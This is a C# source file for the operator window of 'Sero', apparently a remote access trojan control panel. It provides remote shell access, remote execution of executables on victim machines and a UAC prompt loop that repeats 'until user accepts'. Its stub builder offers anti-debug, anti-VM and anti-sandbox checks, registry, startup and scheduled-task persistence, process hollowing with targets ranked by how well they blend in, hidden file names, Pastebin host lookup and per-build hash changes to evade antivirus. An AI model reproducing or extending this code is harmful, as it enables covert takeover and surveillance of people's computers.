using System.Collections.ObjectModel;
using System.IO;
using System.Text.Json;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Threading;
using SeroServer.Data;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public partial class ServerWindow : Window
{
    private readonly DataStore _store = new();
    private TlsServer? _server;
    private DateTime _serverStartedAt;
    private readonly DispatcherTimer _dashTimer;
    private readonly DispatcherTimer _uptimeTimer;
    private readonly System.Collections.ObjectModel.ObservableCollection<Data.AutoTaskEntry> _autoTasks = new();
    private Net.SeroDiscordRPC? _discordRpc;
    private readonly ObservableCollection<ConnectedClient> _onlineClients = new();
    private volatile bool _clientsDirty = true;

    private static string ConfigFilePath
    {
        get
        {
            var dir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
            Directory.CreateDirectory(dir);
            return Path.Combine(dir, "server_config.json");
        }
    }

    public ServerWindow()
    {
        InitializeComponent();

        _dashTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(5) };
        _dashTimer.Tick += (_, _) => RefreshDashboard();

        _uptimeTimer = new DispatcherTimer { Interval = TimeSpan.FromSeconds(1) };
        _uptimeTimer.Tick += (_, _) => RefreshUptime();

        Loaded += (_, _) =>
        {
            GridClients.ItemsSource = _onlineClients;
            Log("[*] Server ready. Click START to listen.");
            RefreshAllClients();
            LoadConfig();
            // Initialize default host if empty
            if (BldHosts.Items.Count == 0)
                BldHosts.Items.Add("127.0.0.1");
            GridAutoTasks.ItemsSource = _autoTasks;
            InitHollowTargets();

            // First launch: cert + auth key setup
            bool needsCert;
            try
            {
                var certDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SeroServer");
                needsCert = !File.Exists(Path.Combine(certDir, "server.pfx"));
            }
            catch { needsCert = true; }

            if (needsCert)
                ShowCertSetupDialog();

            // Re-check AFTER dialog — importing a .sero may have restored the auth key
            if (string.IsNullOrEmpty(BldAuthKey.Text.Trim()))
            {
                var bytes = System.Security.Cryptography.RandomNumberGenerator.GetBytes(24);
                BldAuthKey.Text = Convert.ToBase64String(bytes);
                SaveConfig();
                Log("[+] Auth key generated and saved.");
            }

            // Always load cert hash
            try { BldCertHash.Text = Net.CertificateHelper.GetCertSha256Hash(); }
            catch { BldCertHash.Text = "(start server first)"; }
        };
    }

    private string GetHollowTarget()
    {
        var text = BldHollowTarget.Text?.Trim() ?? "";
        // If it's a raw process name, return as-is
        if (text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            return text;
        // Extract first word (process name) from display string
        return text.Split(' ', StringSplitOptions.RemoveEmptyEntries).FirstOrDefault() ?? "svchost.exe";
    }

    private void InitHollowTargets()
    {
        var targets = new (string proc, int score, string note)[]
        {
            ("svchost.exe", 95, "many instances, blends in"),
            ("RuntimeBroker.exe", 90, "runs often, lightweight"),
            ("dllhost.exe", 90, "COM surrogate, common"),
            ("conhost.exe", 85, "console host, normal"),
            ("sihost.exe", 85, "shell infrastructure"),
            ("taskhostw.exe", 85, "task host, expected"),
            ("audiodg.exe", 85, "audio device graph"),
            ("SearchProtocolHost.exe", 80, "Windows Search"),
            ("backgroundTaskHost.exe", 80, "UWP background"),
            ("smartscreen.exe", 80, "Defender, may restart"),
            ("spoolsv.exe", 80, "print spooler service"),
            ("WmiPrvSE.exe", 75, "WMI provider, admin"),
            ("wlanext.exe", 75, "WiFi extensibility"),
            ("dwm.exe", 70, "desktop window manager, risky"),
            ("explorer.exe", 70, "shell, crash = desktop gone"),
            ("notepad.exe", 70, "suspicious if visible"),
            ("msiexec.exe", 60, "installer, short-lived"),
            ("cmd.exe", 55, "suspicious if persistent"),
            ("powershell.exe", 50, "flagged by most AV"),
        };

        BldHollowTarget.Items.Clear();
        foreach (var (proc, score, note) in targets)
        {
            var brush = score >= 85
                ? new SolidColorBrush(Color.FromRgb(0x1b, 0x8a, 0x2e))
                : score >= 70
                    ? new SolidColorBrush(Color.FromRgb(0xb8, 0x86, 0x0b))
                    : new SolidColorBrush(Color.FromRgb(0xcc, 0x33, 0x33));
            BldHollowTarget.Items.Add(new HollowTargetItem { Proc = proc, Score = $"{score}%", Note = note, ScoreColor = brush });
        }

        BldHollowTarget.SelectionChanged += (_, _) =>
        {
            if (BldHollowTarget.SelectedItem is HollowTargetItem item)
                BldHollowTarget.Text = item.Proc;
        };
    }

    public class HollowTargetItem
    {
        public string Proc { get; set; } = "";
        public string Score { get; set; } = "";
        public string Note { get; set; } = "";
        public System.Windows.Media.Brush ScoreColor { get; set; } = System.Windows.Media.Brushes.Black;
        public override string ToString() => Proc;
    }

    // ── Server Control ──────────────────────────────

    private void StartStop_Click(object sender, RoutedEventArgs e)
    {
        if (_server is { IsRunning: true })
        {
            _server.Stop();
            _dashTimer.Stop();
            _uptimeTimer.Stop();
            _discordRpc?.Stop();
            _discordRpc = null;
            TxtPort.IsEnabled = true;
            SetServerStatus(false);
            BtnStartStop.Content = "START";
            _server = null;
            _onlineClients.Clear();
            UpdateClientCount();
            Log("[*] Server stopped.");
        }
        else
        {
            if (!int.TryParse(TxtPort.Text, out int port) || port < 1 || port > 65535)
            {
                Log("[!] Invalid port.");
                return;
            }

            SaveConfig();

            try
            {
                _server = new TlsServer(_store);
                _server.OnLog += msg => Dispatcher.Invoke(() => Log(msg));
                _server.ClientConnected += c => Dispatcher.BeginInvoke(async () =>
                {
                    _onlineClients.Add(c);
                    _clientsDirty = true;
                    UpdateClientCount();
                    if (_autoTasks.Count > 0)
                        await ExecuteAutoTasksForClient(c);
                });
                _server.ClientDisconnected += c => Dispatcher.BeginInvoke(() =>
                {
                    var existing = _onlineClients.FirstOrDefault(x => x.Id == c.Id);
                    if (existing != null) _onlineClients.Remove(existing);
                    _clientsDirty = true;
                    UpdateClientCount();
                });
                _server.ElevationResultReceived += (clientId, data) => Dispatcher.Invoke(() =>
                {
                    var status = data.Success ? "ELEVATED" : "FAILED";
                    Log($"[UAC] Client {clientId}: {status} - {data.Message}");

                    // Refresh admin status
                    if (data.Success) RefreshClients();
                });

                // Set auth key, client ID prefix, and max clients
                var authKey = BldAuthKey.Text.Trim();
                if (string.IsNullOrEmpty(authKey))
                {
                    Log("[!] Auth key is required. Generate one in the Builder tab first.");
                    return;
                }
                _server.AuthKey = authKey;
                _server.GetClientIdPrefix = () => Dispatcher.Invoke(() => BldClientIdPrefix.Text.Trim());
                if (int.TryParse(SettingsMaxClients.Text, out int maxClients) && maxClients > 0)
                    _server.MaxConnectedClients = maxClients;
                _server.Start(port);
                _serverStartedAt = DateTime.UtcNow;
                TxtPort.IsEnabled = false;
                SetServerStatus(true);
                BtnStartStop.Content = "STOP";
                _dashTimer.Start();
                _uptimeTimer.Start();

                // Discord RPC
                if (SettingsDiscordRPC.IsChecked == true)
                {
                    try
                    {
                        _discordRpc = new Net.SeroDiscordRPC();
                        _discordRpc.Start(() => _server?.ConnectedClients.Count ?? 0);
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Log($"[!] Failed to start: {ex.Message}");
            }
        }
    }

    private void SetServerStatus(bool running)
    {
        var brush = running
            ? (Brush)FindResource("GreenBrush")
            : (Brush)FindResource("RedBrush");

        ServerDot.Fill = brush;
        TitleDot.Fill = brush;
        TxtServerStatus.Text = running ? "Running" : "Stopped";
    }

    private void UpdateClientCount()
    {
        var count = _server?.ConnectedClients.Count ?? 0;
        TxtClientCount.Text = $"  |  {count} client{(count != 1 ? "s" : "")}";
    }

    private void RefreshClients()
    {
        if (_server == null) return;
        // Sync _onlineClients with actual ConnectedClients
        var current = _server.ConnectedClients.Values.ToHashSet();
        // Remove stale
        for (int i = _onlineClients.Count - 1; i >= 0; i--)
        {
            if (!current.Any(c => c.Id == _onlineClients[i].Id))
                _onlineClients.RemoveAt(i);
        }
        // Add missing
        foreach (var c in current)
        {
            if (!_onlineClients.Any(x => x.Id == c.Id))
                _onlineClients.Add(c);
        }
    }

    private void RefreshAllClients()
    {
        GridAllClients.ItemsSource = null;
        GridAllClients.ItemsSource = new ObservableCollection<ClientRecord>(_store.AllClients.Values.OrderByDescending(r => r.LastSeen));
    }

    private void RefreshUptime()
    {
        var uptime = DateTime.UtcNow - _serverStartedAt;
        DashUptime.Text = uptime.TotalHours >= 1
            ? $"{(int)uptime.TotalHours}h {uptime.Minutes}m {uptime.Seconds:D2}s"
            : $"{uptime.Minutes}m {uptime.Seconds:D2}s";
    }

    private void RefreshDashboard()
    {
        var online = _server?.ConnectedClients.Count ?? 0;
        var total = _store.AllClients.Count;

        DashOnline.Text = online.ToString();
        DashTotal.Text = total.ToString();

        UpdateClientCount();

        // Only rebuild grids when something changed (add/remove/tag)
        if (_clientsDirty)
        {
            _clientsDirty = false;
            RefreshClients();
            RefreshAllClients();
        }
    }

    // ── Client Actions ──────────────────────────────

    private List<ConnectedClient> GetSelectedClients()
    {
        return GridClients.SelectedItems.Cast<ConnectedClient>().ToList();
    }

    private async void DisconnectClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (_server == null) return;
        foreach (var client in clients)
        {
            // Send Disconnect packet so stub sets ShouldReconnect=false before stream closes
            try { await _server.SendToClient(client.Id, new Packet { Type = PacketType.Disconnect }); } catch { }
            await Task.Delay(150);
            _server.DisconnectClient(client.Id);
        }
    }

    private void GridClients_PreviewKeyDown(object sender, System.Windows.Input.KeyEventArgs e)
    {
        if (e.Key == System.Windows.Input.Key.A && System.Windows.Input.Keyboard.Modifiers == System.Windows.Input.ModifierKeys.Control)
        {
            GridClients.SelectAll();
            e.Handled = true;
        }
    }

    private void RemoteShell_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var shellWindow = new RemoteShellWindow(_server, clients) { Owner = this };
        shellWindow.Show();
        Log($"[*] Remote shell opened for {clients.Count} client(s).");
    }

    private async void RemoteFileExec_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select file to execute on client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new RemoteFileExecData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.RemoteFileExec,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            foreach (var client in clients)
            {
                await _server.SendToClient(client.Id, packet);
            }

            Log($"[+] Sent {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s).");
            TxtStatusBar.Text = $"File sent to {clients.Count} client(s).";
        }
        catch (Exception ex)
        {
            Log($"[!] Remote file exec failed: {ex.Message}");
        }
    }

    private async void UpdateClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable (*.exe)|*.exe|All Files (*.*)|*.*",
            Title = "Select client binary to update client(s)"
        };

        if (dialog.ShowDialog() != true) return;

        try
        {
            var fileBytes = await File.ReadAllBytesAsync(dialog.FileName);
            var fileName = Path.GetFileName(dialog.FileName);

            var data = new UpdateClientData
            {
                FileName = fileName,
                FileBase64 = Convert.ToBase64String(fileBytes)
            };

            var packet = new Packet
            {
                Type = PacketType.UpdateClient,
                Data = Newtonsoft.Json.JsonConvert.SerializeObject(data)
            };

            foreach (var client in clients)
            {
                await _server.SendToClient(client.Id, packet);
            }

            Log($"[+] Sent update {fileName} ({fileBytes.Length:N0} bytes) to {clients.Count} client(s). ");
            TxtStatusBar.Text = $"Update file sent to {clients.Count} client(s).";
        }
        catch (Exception ex)
        {
            Log($"[!] Update client failed: {ex.Message}");
        }
    }

    private async void UninstallClient_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Uninstall client from {clients.Count} machine(s)?\nThis will remove persistence and delete the client.",
            "Confirm Uninstall",
            MessageBoxButton.YesNo,
            MessageBoxImage.Warning);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.Uninstall };

        foreach (var client in clients)
        {
            client.PendingUninstall = true;
            await _server.SendToClient(client.Id, packet);
            Log($"[*] Uninstall sent to {client.Username}@{client.IP} ({client.Id}).");
        }

        TxtStatusBar.Text = $"Uninstall sent to {clients.Count} client(s).";
    }

    // ── UAC Elevation ───────────────────────────────

    private async void RequestElevation_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var packet = new Packet { Type = PacketType.RequestElevation };
        foreach (var client in clients)
        {
            await _server.SendToClient(client.Id, packet);
            Log($"[UAC] Elevation request sent to {client.Username}@{client.IP}.");
        }

        TxtStatusBar.Text = $"UAC elevation sent to {clients.Count} client(s).";
    }

    private async void RequestElevationLoop_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0 || _server == null) return;

        var result = MessageBox.Show(
            $"Loop UAC popup on {clients.Count} machine(s) until user accepts?",
            "Confirm UAC Loop",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result != MessageBoxResult.Yes) return;

        var packet = new Packet { Type = PacketType.RequestElevationLoop };
        foreach (var client in clients)
        {
            await _server.SendToClient(client.Id, packet);
            Log($"[UAC] Elevation loop started on {client.Username}@{client.IP}.");
        }

        TxtStatusBar.Text = $"UAC loop started on {clients.Count} client(s).";
    }

    // ── Tags ────────────────────────────────────────

    private void SetTag_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var currentTag = clients.Count == 1 ? clients[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        foreach (var client in clients)
        {
            client.Tag = dlg.TagValue;
            _store.SetTag(client.Hwid, dlg.TagValue);
        }

        RefreshClients();
        RefreshAllClients();
        TxtStatusBar.Text = $"Tag set on {clients.Count} client(s).";
    }

    private void SetTagRecord_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var currentTag = records.Count == 1 ? records[0].Tag : "";
        var dlg = new TagDialog(currentTag) { Owner = this };
        if (dlg.ShowDialog() != true) return;

        foreach (var record in records)
        {
            _store.SetTag(record.Hwid, dlg.TagValue);
        }

        // Also update any connected clients with matching HWID
        if (_server != null)
        {
            foreach (var record in records)
            {
                foreach (var client in _server.ConnectedClients.Values)
                {
                    if (client.Hwid == record.Hwid)
                        client.Tag = dlg.TagValue;
                }
            }
        }

        RefreshClients();
        RefreshAllClients();
        TxtStatusBar.Text = $"Tag set on {records.Count} record(s).";
    }

    // ── Client Logs ─────────────────────────────────

    private void ViewClientLogs_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        foreach (var client in clients)
        {
            if (_store.AllClients.TryGetValue(client.Hwid, out var record))
            {
                var logWin = new ClientLogWindow(record) { Owner = this };
                logWin.Show();
            }
        }
    }

    private void ViewRecordLogs_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        foreach (var record in records)
        {
            var logWin = new ClientLogWindow(record) { Owner = this };
            logWin.Show();
        }
    }

    // ── Copy ────────────────────────────────────────

    private void CopyHwid_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var hwids = string.Join("\n", clients.Select(c => c.Hwid));
        Clipboard.SetText(hwids);
        TxtStatusBar.Text = clients.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {clients.Count} HWIDs";
    }

    private void CopyIP_Click(object sender, RoutedEventArgs e)
    {
        var clients = GetSelectedClients();
        if (clients.Count == 0) return;

        var ips = string.Join("\n", clients.Select(c => c.IP));
        Clipboard.SetText(ips);
        TxtStatusBar.Text = clients.Count == 1 ? $"Copied IP: {ips}" : $"Copied {clients.Count} IPs";
    }

    private void CopyRecordHwid_Click(object sender, RoutedEventArgs e)
    {
        var records = GridAllClients.SelectedItems.Cast<ClientRecord>().ToList();
        if (records.Count == 0) return;

        var hwids = string.Join("\n", records.Select(r => r.Hwid));
        Clipboard.SetText(hwids);
        TxtStatusBar.Text = records.Count == 1 ? $"Copied HWID: {hwids}" : $"Copied {records.Count} HWIDs";
    }

    // ── Builder ─────────────────────────────────────

    private void BldGenMutex_Click(object sender, RoutedEventArgs e)
    {
        BldMutex.Text = $"Global\\{{{Guid.NewGuid()}}}";
    }

    private void BldPersist_Changed(object sender, RoutedEventArgs e)
    {
        if (BldInstallPanel == null) return;

        bool anyPersist = BldPersistRegistry.IsChecked == true
                       || BldPersistStartup.IsChecked == true
                       || BldPersistTask.IsChecked == true;

        BldInstallPanel.Visibility = anyPersist ? Visibility.Visible : Visibility.Collapsed;

        bool maxPersist = BldWatchdog.IsChecked == true
                       && BldPersistRegistry.IsChecked == true
                       && BldPersistStartup.IsChecked == true
                       && BldPersistTask.IsChecked == true;

        if (TxtMaxPersist != null)
            TxtMaxPersist.Visibility = maxPersist ? Visibility.Visible : Visibility.Collapsed;
    }

    private void BldSaveConfig_Click(object sender, RoutedEventArgs e)
    {
        var result = MessageBox.Show(
            "Save builder configuration?",
            "Sero — Confirm",
            MessageBoxButton.YesNo,
            MessageBoxImage.Question);

        if (result == MessageBoxResult.Yes)
        {
            SaveConfig();
            TxtStatusBar.Text = "Configuration saved.";
        }
    }

    private void BldCheckAll_Click(object sender, RoutedEventArgs e)
    {
        BldAntiDebug.IsChecked = true;
        BldAntiVM.IsChecked = true;
        BldAntiDetect.IsChecked = true;
        BldAntiSandbox.IsChecked = true;
        BldAntiKill.IsChecked = true;
        BldWatchdog.IsChecked = true;
        BldPersistRegistry.IsChecked = true;
        BldPersistStartup.IsChecked = true;
        BldPersistTask.IsChecked = true;
        BldHollowing.IsChecked = true;
    }

    private void LoadConfig()
    {
        try
        {
            if (!File.Exists(ConfigFilePath)) return;
            var json = File.ReadAllText(ConfigFilePath);
            var cfg = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(json);
            if (cfg == null) return;

            // Auth key (locked once set)
            if (cfg.TryGetValue("AuthKey", out var key) && !string.IsNullOrEmpty(key))
            { BldAuthKey.Text = key; BldAuthKey.IsReadOnly = true; }

            // Connection (supports multiple hosts)
            if (cfg.TryGetValue("Hosts", out var hostsJson))
            {
                BldHosts.Items.Clear();
                var hosts = Newtonsoft.Json.JsonConvert.DeserializeObject<List<string>>(hostsJson);
                if (hosts != null)
                {
                    foreach (var h in hosts)
                        BldHosts.Items.Add(h);
                }
            }
            else if (cfg.TryGetValue("Host", out var host))
            {
                // Backward compatibility with old single-host config
                BldHosts.Items.Clear();
                BldHosts.Items.Add(host);
            }
            if (cfg.TryGetValue("Port", out var port)) { BldPort.Text = port; TxtPort.Text = port; }
            if (cfg.TryGetValue("UsePastebin", out var pastebin)) BldUsePastebin.IsChecked = pastebin == "1";
            if (cfg.TryGetValue("PastebinUrl", out var pastebinUrl)) BldPastebinUrl.Text = pastebinUrl;

            // Identity
            if (cfg.TryGetValue("ClientIdPrefix", out var cp)) BldClientIdPrefix.Text = cp;

            // Checkboxes
            if (cfg.TryGetValue("AntiDebug", out var v)) BldAntiDebug.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiVM", out v)) BldAntiVM.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiDetect", out v)) BldAntiDetect.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiSandbox", out v)) BldAntiSandbox.IsChecked = v == "1";
            if (cfg.TryGetValue("AntiKill", out v)) BldAntiKill.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistRegistry", out v)) BldPersistRegistry.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistStartup", out v)) BldPersistStartup.IsChecked = v == "1";
            if (cfg.TryGetValue("PersistTask", out v)) BldPersistTask.IsChecked = v == "1";
            if (cfg.TryGetValue("Hollowing", out v)) BldHollowing.IsChecked = v == "1";
            if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
            if (cfg.TryGetValue("Watchdog", out v)) BldWatchdog.IsChecked = v == "1";
            if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
            if (cfg.TryGetValue("UacBypass", out v)) BldUacBypass.IsChecked = v == "1";

            // Reconnect
            if (cfg.TryGetValue("ReconnectDelay", out var rd)) BldReconnectDelay.Text = rd;

            // Install folder & file name
            if (cfg.TryGetValue("InstallFolder", out var installFolder)) BldInstallFolder.Text = installFolder;
            if (cfg.TryGetValue("InstallFileName", out var installFileName)) BldInstallFileName.Text = installFileName;

            Log("[+] Builder config loaded.");
        }
        catch { }
    }

    private void SaveConfig()
    {
        try
        {
            var path = ConfigFilePath;
            var cfg = new Dictionary<string, string>
            {
                ["AuthKey"] = BldAuthKey.Text.Trim(),
                ["Hosts"] = Newtonsoft.Json.JsonConvert.SerializeObject(BldHosts.Items.Cast<string>().ToList()),
                ["Host"] = GetPrimaryHost(), // backward compatibility
                ["Port"] = TxtPort.Text.Trim(),
                ["ClientIdPrefix"] = BldClientIdPrefix.Text.Trim(),
                ["UsePastebin"] = BldUsePastebin.IsChecked == true ? "1" : "0",
                ["PastebinUrl"] = BldPastebinUrl.Text.Trim(),
                ["AntiDebug"] = BldAntiDebug.IsChecked == true ? "1" : "0",
                ["AntiVM"] = BldAntiVM.IsChecked == true ? "1" : "0",
                ["AntiDetect"] = BldAntiDetect.IsChecked == true ? "1" : "0",
                ["AntiSandbox"] = BldAntiSandbox.IsChecked == true ? "1" : "0",
                ["AntiKill"] = BldAntiKill.IsChecked == true ? "1" : "0",
                ["PersistRegistry"] = BldPersistRegistry.IsChecked == true ? "1" : "0",
                ["PersistStartup"] = BldPersistStartup.IsChecked == true ? "1" : "0",
                ["PersistTask"] = BldPersistTask.IsChecked == true ? "1" : "0",
                ["Hollowing"] = BldHollowing.IsChecked == true ? "1" : "0",
                ["HollowTarget"] = GetHollowTarget(),
                ["Watchdog"] = BldWatchdog.IsChecked == true ? "1" : "0",
                ["Encrypt"] = BldEncrypt.IsChecked == true ? "1" : "0",
                ["UacBypass"] = BldUacBypass.IsChecked == true ? "1" : "0",
                ["ReconnectDelay"] = BldReconnectDelay.Text.Trim(),
                ["InstallFolder"] = BldInstallFolder.Text.Trim(),
                ["InstallFileName"] = BldInstallFileName.Text.Trim(),
            };
            File.WriteAllText(path, Newtonsoft.Json.JsonConvert.SerializeObject(cfg, Newtonsoft.Json.Formatting.Indented));
            Log($"[+] Config saved to {path}");

        }
        catch (Exception ex) { Log($"[!] Failed to save config: {ex.Message}"); }
    }

    private string GetStubProjectDir()
    {
        // Strategy 1: relative to BaseDirectory (bin/Debug/net10.0-windows -> sero/)
        var serverDir = AppDomain.CurrentDomain.BaseDirectory;
        var seroRoot = Path.GetFullPath(Path.Combine(serverDir, "..", "..", "..", ".."));
        var stubDir = Path.Combine(seroRoot, "stub");
        if (Directory.Exists(stubDir) && File.Exists(Path.Combine(stubDir, "SeroStub.csproj")))
            return stubDir;

        // Strategy 2: walk up from BaseDirectory looking for stub/SeroStub.csproj
        var dir = new DirectoryInfo(serverDir);
        while (dir != null)
        {
            var candidate = Path.Combine(dir.FullName, "stub");
            if (File.Exists(Path.Combine(candidate, "SeroStub.csproj")))
                return candidate;
            dir = dir.Parent;
        }

        // Fallback
        return stubDir;
    }

    private string GenerateConfigCs()
    {
        int.TryParse(BldPort.Text, out int port);
        int.TryParse(BldReconnectDelay.Text, out int reconnect);
        if (port < 1 || port > 65535) port = 7777;
        if (reconnect < 1000) reconnect = 5000;

        var installFolder = BldInstallFolder.Text.Trim();
        if (string.IsNullOrEmpty(installFolder)) installFolder = "Windows";
        var installFileName = BldInstallFileName.Text.Trim();
        if (string.IsNullOrEmpty(installFileName)) installFileName = "windows.exe";
        // Ensure .exe extension
        if (!installFileName.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
            installFileName += ".exe";
        var fileNameNoExt = Path.GetFileNameWithoutExtension(installFileName);

        var useMutex = BldUseMutex.IsChecked == true ? "true" : "false";
        var mutexName = BldUseMutex.IsChecked == true ? BldMutex.Text.Trim().Replace("\\", "\\\\") : "";

        // Escape for C# string literal — prevents quote injection in generated Config.cs
        static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

        return $@"namespace SeroStub;

internal static class Config
{{
    public const string Host = ""{Esc(GetPrimaryHost())}"";
    public const int Port = {port};
    public const bool UseMutex = {useMutex};
    public const string MutexName = ""{mutexName}"";

    public const bool AntiDebug = {(BldAntiDebug.IsChecked == true ? "true" : "false")};
    public const bool AntiVM = {(BldAntiVM.IsChecked == true ? "true" : "false")};
    public const bool AntiDetect = {(BldAntiDetect.IsChecked == true ? "true" : "false")};
    public const bool AntiSandbox = {(BldAntiSandbox.IsChecked == true ? "true" : "false")};

    public const bool PersistRegistry = {(BldPersistRegistry.IsChecked == true ? "true" : "false")};
    public const bool PersistStartup = {(BldPersistStartup.IsChecked == true ? "true" : "false")};
    public const bool PersistTask = {(BldPersistTask.IsChecked == true ? "true" : "false")};
    public const string PersistName = ""{Esc(installFolder)}"";

    public const bool AntiKill = {(BldAntiKill.IsChecked == true ? "true" : "false")};
    public const bool EnableWatchdog = {(BldWatchdog.IsChecked == true ? "true" : "false")};
    public const bool EnableHollowing = {(BldHollowing.IsChecked == true ? "true" : "false")};
    public const string HollowTarget = ""{Esc(GetHollowTarget())}"";

    public const string AuthKey = ""{Esc(BldAuthKey.Text.Trim())}"";
    public const string CertHash = ""{Esc(BldCertHash.Text.Trim())}"";

    // Unique per build — changes the compiled binary hash even with identical settings
    public const string BuildId = ""{Guid.NewGuid():N}"";

    public const int ReconnectDelayMs = {reconnect};
    public const int HeartbeatIntervalMs = 10000;

    public const string ClientIdPrefix = ""{Esc(BldClientIdPrefix.Text.Trim())}"";

    public const string HiddenProcessName = ""{Esc(fileNameNoExt.ToLowerInvariant())}"";
    public const string HiddenFileName = ""{Esc(installFileName.ToLowerInvariant())}"";
    public const string HiddenRegKey = ""{Esc(installFolder)}"";
}}
";
    }

    private string GetPrimaryHost()
    {
        // Get first host from ListBox, or first from comma-separated, or default
        if (BldHosts.Items.Count > 0)
            return (BldHosts.Items[0] as string) ?? "127.0.0.1";
        return "127.0.0.1";
    }

    private void BldAddHost_Click(object sender, RoutedEventArgs e)
    {
        var hostInput = BldHostInput.Text.Trim();
        if (!string.IsNullOrEmpty(hostInput) && !BldHosts.Items.Contains(hostInput))
        {
            BldHosts.Items.Add(hostInput);
            BldHostInput.Clear();
        }
    }

    private void BldDelHost_Click(object sender, RoutedEventArgs e)
    {
        if (BldHosts.SelectedIndex >= 0)
            BldHosts.Items.RemoveAt(BldHosts.SelectedIndex);
    }

    private void BldUsePastebin_Checked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = false;
        BldHostInput.IsEnabled = false;
        BldPort.IsEnabled = false;
        BldPastebinUrl.IsEnabled = true;
    }

    private void BldUsePastebin_Unchecked(object sender, RoutedEventArgs e)
    {
        BldHosts.IsEnabled = true;
        BldHostInput.IsEnabled = true;
        BldPort.IsEnabled = true;
        BldPastebinUrl.IsEnabled = false;
    }


    private void ApplyIcon(string exePath, string iconPath)
    {
        try
        {
            // Try multiple locations for rcedit.exe
            var candidates = new[]
            {
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "rcedit.exe")), // repo root (bin/Release/net10.0-windows/ → 4 levels up)
                Path.GetFullPath(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "rcedit.exe")), // fallback 3 levels
                "rcedit.exe", // PATH
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "..", "..", "Downloads", "sero", "ancien code", "code qui marchai", "rcedit.exe"),
            };

            string? rceditPath = null;
            foreach (var candidate in candidates)
            {
                if (File.Exists(candidate))
                {
                    rceditPath = candidate;
                    break;
                }
            }

            if (rceditPath == null)
            {
                Log($"[!] Builder: rcedit.exe not found. Icon not applied.");
                return;
            }

            Log($"[*] Builder: Using rcedit at {rceditPath}");

            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = rceditPath,
                Arguments = $"\"{exePath}\" --set-icon \"{iconPath}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };

            using var process = System.Diagnostics.Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit();
                if (process.ExitCode == 0)
                {
                    Log($"[+] Builder: Icon applied successfully");
                }
                else
                {
                    Log($"[!] Builder: rcedit failed (exit code {process.ExitCode})");
                }
            }
        }
        catch (Exception ex)
        {
            Log($"[!] Builder: Icon application error: {ex.Message}");
        }
    }

    private void BldSetAssembly_Checked(object sender, RoutedEventArgs e)
    {
        var dialog = new Microsoft.Win32.OpenFileDialog
        {
            Filter = "Executable files (*.exe)|*.exe",
            Title = "Select executable file"
        };
        if (dialog.ShowDialog() == true)
        {
            // Store the full path in Tag for use in Build_Click
            BldAssemblyPath.Tag = dialog.FileName;
            // Display only the filename
            BldAssemblyPath.Text = Path.GetFileName(dialog.FileName);
        }
        else
        {
            BldSetAssembly.IsChecked = false;
        }
    }

    private void BldSetAssembly_Unchecked(object sender, RoutedEventArgs e)
    {
        BldAssemblyPath.Text = "No executable selected";
